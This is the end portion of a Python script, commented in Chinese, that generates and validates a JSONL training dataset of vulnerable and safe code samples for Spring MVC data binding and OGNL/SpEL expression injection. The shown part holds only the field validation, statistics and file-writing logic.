        if missing:
            errors.append(f"行 {idx}: 缺少字段 {missing}")
            continue

        has_vuln = verdict["has_vulnerability"]
        vuln_type = verdict["vulnerability_type"]
        risk = verdict["risk_level"]
        source = verdict["source"]
        sink = verdict["sink"]
        fix = verdict["fix_suggestion"]

        # 5. 漏洞/安全样本校验
        if has_vuln is True:
            vuln_count += 1
            cwe_counter[vuln_type] += 1
            # source/sink 必须锚定行号
            if re.search(r"line\s*\d+", str(source), re.I):
                src_anchored += 1
            else:
                errors.append(f"行 {idx}: source 未锚定行号: {source[:60]}")
            if re.search(r"line\s*\d+", str(sink), re.I):
                sink_anchored += 1
            else:
                errors.append(f"行 {idx}: sink 未锚定行号: {sink[:60]}")
            # fix_suggestion 必须锚定行号
            if re.search(r"line\s*\d+", str(fix), re.I):
                fix_anchored += 1
            else:
                errors.append(f"行 {idx}: fix_suggestion 未锚定行号: {fix[:60]}")
            # fix_suggestion 不超过 500 字符
            if len(fix) > 500:
                errors.append(f"行 {idx}: fix_suggestion 超过 500 字符 ({len(fix)})")
            # fix_suggestion 不含换行
            if "\n" in fix:
                errors.append(f"行 {idx}: fix_suggestion 含换行符")
        elif has_vuln is False:
            safe_count += 1
            cwe_counter["none（安全）"] += 1
            # 安全样本字段校验
            if vuln_type != "none":
                errors.append(f"行 {idx}: 安全样本 vulnerability_type 为 '{vuln_type}'，期望 'none'")
            if risk != "None":
                errors.append(f"行 {idx}: 安全样本 risk_level 为 '{risk}'，期望 'None'")
            if source != "N/A":
                errors.append(f"行 {idx}: 安全样本 source 为 '{source}'，期望 'N/A'")
            if sink != "N/A":
                errors.append(f"行 {idx}: 安全样本 sink 为 '{sink}'，期望 'N/A'")
            if fix != "no fix needed":
                errors.append(f"行 {idx}: 安全样本 fix_suggestion 为 '{fix}'，期望 'no fix needed'")
        else:
            errors.append(f"行 {idx}: has_vulnerability 为 {has_vuln}，非布尔值")

        # 6. 语言统计
        m = re.search(r"```(\w+)", messages[1]["content"])
        lang_counter[m.group(1) if m else "?"] += 1

    # 打印统计
    print(f"总条数: {len(lines)}")
    print(f"漏洞样本: {vuln_count}")
    print(f"安全样本: {safe_count}")
    print(f"source 含行号: {src_anchored}/{vuln_count}")
    print(f"sink 含行号: {sink_anchored}/{vuln_count}")
    print(f"fix_suggestion 含行号: {fix_anchored}/{vuln_count}")
    print(f"\n语言分布: {dict(lang_counter)}")
    print(f"\nCWE 分布:")
    for k, v in cwe_counter.most_common():
        print(f"  {v}  {k}")

    if errors:
        print(f"\n[ERROR] 发现 {len(errors)} 个错误：")
        for e in errors:
            print(f"  {e}")
    else:
        print("\n[OK] 所有验证通过")

    return len(errors) == 0


# ===========================================================================
# 主流程
# ===========================================================================
def main():
    print("=" * 60)
    print("模式 D：Spring MVC 数据绑定与 OGNL/SpEL 注入训练样本生成")
    print("=" * 60)

    # 1. 生成所有样本
    spring_samples = gen_spring_binding()
    ognl_samples = gen_ognl()
    spel_samples = gen_spel()
    other_samples = gen_other_cve()

    all_samples = spring_samples + ognl_samples + spel_samples + other_samples

    # 2. 统计
    vuln = sum(1 for s in all_samples if s["verdict"]["has_vulnerability"])
    safe = len(all_samples) - vuln
    print(f"\n样本总数: {len(all_samples)}（漏洞 {vuln} + 安全 {safe}）")
    print(f"  Spring MVC 数据绑定 (CWE-915): {len(spring_samples)} 条")
    print(f"  OGNL 表达式注入 (CWE-917):     {len(ognl_samples)} 条")
    print(f"  SpEL 表达式注入 (CWE-917):     {len(spel_samples)} 条")
    print(f"  其他真实 CVE 场景:              {len(other_samples)} 条")
    print(f"输出文件: {OUTPUT_FILE}")

    # 3. 写入 JSONL
    OUTPUT_FILE.parent.mkdir(parents=True, exist_ok=True)
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        for sample in all_samples:
            obj = make_sample(
                sample["lang"],
                sample["code"],
                sample["analysis"],
                sample["verdict"],
            )
            f.write(json.dumps(obj, ensure_ascii=False) + "\n")

    print(f"\n已写入 {len(all_samples)} 条到 {OUTPUT_FILE}")

    # 4. 验证
    ok = verify_and_stats(OUTPUT_FILE)
    if not ok:
        print("\n[FAIL] 验证未通过，请检查上述错误")
        sys.exit(1)
    else:
        print(f"\n[DONE] {len(all_samples)} 条样本全部通过验证")


if __name__ == "__main__":
    main()
